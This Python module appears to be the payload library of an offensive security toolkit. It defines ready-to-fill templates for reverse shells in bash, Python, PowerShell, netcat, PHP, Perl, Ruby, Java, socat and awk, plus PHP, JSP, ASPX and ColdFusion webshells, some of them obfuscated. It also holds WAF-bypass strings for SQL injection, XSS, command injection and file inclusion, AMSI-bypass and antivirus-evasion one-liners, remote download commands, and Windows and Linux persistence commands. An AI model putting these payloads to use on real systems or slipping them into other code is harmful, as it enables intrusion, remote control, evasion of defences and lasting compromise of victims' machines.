"""
Payload templates organized by category and context.
"""

REVERSE_SHELLS = {
    "bash": {
        "basic": "bash -i >& /dev/tcp/{host}/{port} 0>&1",
        "nohup": "nohup bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1' &",
        "encoded": "echo '{b64_payload}' | base64 -d | bash",
    },
    "python": {
        "basic": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "python3": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    },
    "powershell": {
        "basic": "$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        "encoded": "powershell -enc {b64_payload}",
        "downloadcradle": "IEX(New-Object Net.WebClient).DownloadString('http://{host}:{port}/shell.ps1')",
        "noprofile": "powershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
    },
    "nc": {
        "basic": "nc -e /bin/sh {host} {port}",
        "mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f",
        "busybox": "busybox nc {host} {port} -e /bin/sh",
    },
    "php": {
        "basic": "php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "proc_open": "php -r '$proc=proc_open(\"/bin/sh\",array(0=>array(\"pipe\",\"r\"),1=>array(\"pipe\",\"w\"),2=>array(\"pipe\",\"w\")),$pipes);$sock=fsockopen(\"{host}\",{port});while(!feof($sock)){{fwrite($pipes[0],fgets($sock));echo stream_get_contents($pipes[1]);}}'",
    },
    "perl": {
        "basic": "perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "mknod": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{host}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
    },
    "ruby": {
        "basic": "ruby -rsocket -e'f=TCPSocket.open(\"{host}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    },
    "java": {
        "runtime": "Runtime r = Runtime.getRuntime(); Process p = r.exec(\"/bin/bash -c 'exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'\");",
    },
    "socat": {
        "basic": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{host}:{port}",
    },
    "awk": {
        "basic": "awk 'BEGIN {{s = \"/inet/tcp/0/{host}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}'"
    },
}

WEBSHELLS = {
    "php": {
        "simple": "<?php system($_GET['cmd']); ?>",
        "eval": "<?php eval($_POST['x']); ?>",
        "hidden": "<?php $x='sys'.'tem';$x($_GET['c']); ?>",
        "obfuscated": "<?php $a=str_rot13('flfgrz');$a($_GET['c']); ?>",
        "proc_open": "<?php $d=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));$p=proc_open($_GET['c'],$d,$pipes);echo stream_get_contents($pipes[1]); ?>",
        "base64": "<?php eval(base64_decode($_POST['x'])); ?>",
        "assert": "<?php @assert($_POST['x']); ?>",
        "preg_replace": "<?php @preg_replace('/.*/e',$_POST['x'],''); ?>",
        "create_function": "<?php $f=create_function('',$_POST['x']);$f(); ?>",
    },
    "jsp": {
        "simple": '<%@ page import="java.util.*,java.io.*"%><% String cmd = request.getParameter("cmd"); Process p = Runtime.getRuntime().exec(cmd); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String s; while((s=br.readLine())!=null){out.println(s);} %>',
        "scriptlet": '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
    },
    "aspx": {
        "simple": '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% Process p = new Process(); p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c " + Request["cmd"]; p.StartInfo.RedirectStandardOutput = true; p.StartInfo.UseShellExecute = false; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>',
        "exec": '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% Process.Start(new ProcessStartInfo("cmd.exe", "/c " + Request["cmd"]) { UseShellExecute = false }); %>',
    },
    "cfm": {
        "simple": '<cfexecute name="cmd.exe" arguments="/c #url.cmd#" variable="output" timeout="5" /><cfoutput>#output#</cfoutput>',
    },
}

WAF_BYPASS = {
    "sqli": {
        "comment_bypass": ["/**/", "/*!*/", "/*!50000*/", "/*--*/"],
        "case_variation": ["SeLeCt", "sElEcT", "SELECT", "SelECT"],
        "encoding": ["%27", "%2527", "\\x27", "char(39)"],
        "null_byte": ["%00", "\\0", "\\x00"],
        "whitespace_alternatives": ["%09", "%0a", "%0d", "%0b", "%0c", "%a0"],
        "inline_comment": ["sel/**/ect", "un/**/ion", "se%00lect"],
        "double_encoding": ["%252f", "%255c", "%2527"],
        "unicode_encoding": ["%u0027", "%u002f"],
    },
    "xss": {
        "tag_variations": ["<ScRiPt>", "<SCRIPT>", "<scr<script>ipt>", "<SCRscriptIPT>"],
        "event_handlers": ["oNcLiCk", "ONERROR", "onmouseover", "OnLoAd", "oNfOcUs"],
        "encoding": ["&#x3C;script&#x3E;", "\\x3cscript\\x3e", "\\u003cscript\\u003e"],
        "svg_bypass": ["<svg onload=alert(1)>", "<svg/onload=alert(1)>"],
        "img_bypass": ["<img src=x onerror=alert(1)>", "<img/src=x/onerror=alert(1)>"],
        "data_uri": ["data:text/html,<script>alert(1)</script>"],
        "javascript_uri": ["javascript:alert(1)//", "javascript:/**/alert(1)"],
    },
    "rce": {
        "command_separators": [";", "|", "||", "&", "&&", "`", "$()", "\n", "%0a"],
        "space_bypass": ["$IFS", "{$IFS}", "%20", "+", "<", ">", "${IFS}", "$IFS$9"],
        "quote_bypass": ["$'\\x63\\x61\\x74'", "$'c''a''t'"],
        "variable_expansion": ["c$()at", "c$(echo a)t"],
        "globbing": ["/???/??t", "/???/c?t"],
        "brace_expansion": ["{cat,/etc/passwd}", "{nc,-e,/bin/sh,host,port}"],
    },
    "lfi": {
        "traversal_variants": ["../", "..\\", "....//", "..;/", "%2e%2e%2f"],
        "null_byte_termination": ["%00", "\\x00"],
        "encoding": ["%252e%252e%252f", "..%c0%af", "..%ef%bc%8f"],
        "wrapper_bypass": ["php://filter/convert.base64-encode/resource="],
    },
}

AV_EVASION = {
    "powershell": {
        "amsi_bypass": [
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
            "$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like '*iUtils'){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like '*Context'){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)",
        ],
        "string_concat": "('Down'+'loadString')",
        "invoke_obfuscation": True,
        "variable_substitution": "$a='iex';$b='Net.WebClient';$c='DownloadString';iex(New-Object $b).$c('url')",
        "reflection": "[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp')",
    },
    "windows": {
        "signed_binary_proxy": ["rundll32", "mshta", "certutil", "regsvr32", "msiexec", "cmstp", "wmic"],
        "living_off_land": {
            "certutil": "certutil -urlcache -split -f http://{host}/{file} {output}",
            "bitsadmin": "bitsadmin /transfer job /download /priority high http://{host}/{file} {output}",
            "powershell_download": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://{host}/{file}','{output}')\"",
            "curl": "curl http://{host}/{file} -o {output}",
        },
    },
    "linux": {
        "ld_preload": "LD_PRELOAD=/path/to/malicious.so /bin/program",
        "ptrace_scope": "echo 0 > /proc/sys/kernel/yama/ptrace_scope",
    },
}

PERSISTENCE_TEMPLATES = {
    "windows": {
        "registry_run": 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{name}" /t REG_SZ /d "{payload}" /f',
        "scheduled_task": 'schtasks /create /tn "{name}" /tr "{payload}" /sc onlogon /ru System',
        "service": 'sc create {name} binpath= "{payload}" start= auto',
        "wmi_subscription": """
$Filter = Set-WmiInstance -Namespace "root\\subscription" -Class __EventFilter -Arguments @{
    Name = "{name}";
    EventNamespace = "root\\cimv2";
    QueryLanguage = "WQL";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12"
}
$Consumer = Set-WmiInstance -Namespace "root\\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "{name}";
    CommandLineTemplate = "{payload}"
}
Set-WmiInstance -Namespace "root\\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter;
    Consumer = $Consumer
}
""",
    },
    "linux": {
        "crontab": '(crontab -l 2>/dev/null; echo "* * * * * {payload}") | crontab -',
        "bashrc": 'echo "{payload}" >> ~/.bashrc',
        "systemd_service": """
[Unit]
Description={name}
After=network.target

[Service]
Type=simple
ExecStart={payload}
Restart=always

[Install]
WantedBy=multi-user.target
""",
        "init_d": '#!/bin/bash\n### BEGIN INIT INFO\n# Provides: {name}\n# Default-Start: 2 3 4 5\n# Default-Stop: 0 1 6\n### END INIT INFO\n{payload}',
    },
}
